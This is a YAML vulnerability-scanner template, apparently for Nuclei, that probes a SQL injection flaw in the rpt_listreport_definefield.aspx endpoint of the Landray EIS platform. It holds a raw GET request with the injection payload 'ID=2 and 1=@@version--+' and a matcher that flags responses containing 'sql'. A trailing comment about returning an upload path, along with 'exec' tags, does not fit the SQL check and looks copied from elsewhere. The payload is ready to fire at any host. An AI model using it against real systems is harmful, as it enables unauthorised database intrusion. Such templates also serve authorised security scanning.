id: lanlingOA-EIS-rpt-listreport-definefield-aspx-sql

info:
  name: 蓝凌EIS智慧协同平台rpt_listreport_definefield.aspx接口存在SQL注入漏洞
  author: cnaq
  severity: high
  description: 蓝凌EIS智慧协同平台rpt_listreport_definefield.aspx接口存在SQL注入漏洞
  reference:
    - https://github.com/wy876/POC/blob/main/%E8%93%9D%E5%87%8CEIS%E6%99%BA%E6%85%A7%E5%8D%8F%E5%90%8C%E5%B9%B3%E5%8F%B0rpt_listreport_definefield.aspx%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
  tags: lanlingOA,code,exec
  
requests:
  - raw:
      - |
        GET /SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+ HTTP/1.1
        Host: {{Hostname}} 
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Connection: Keep-Alive
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Upgrade-Insecure-Requests: 1

    matchers:
      - type: word
        part: body
        words:
          - 'sql'

# 返回包会返回上传的路径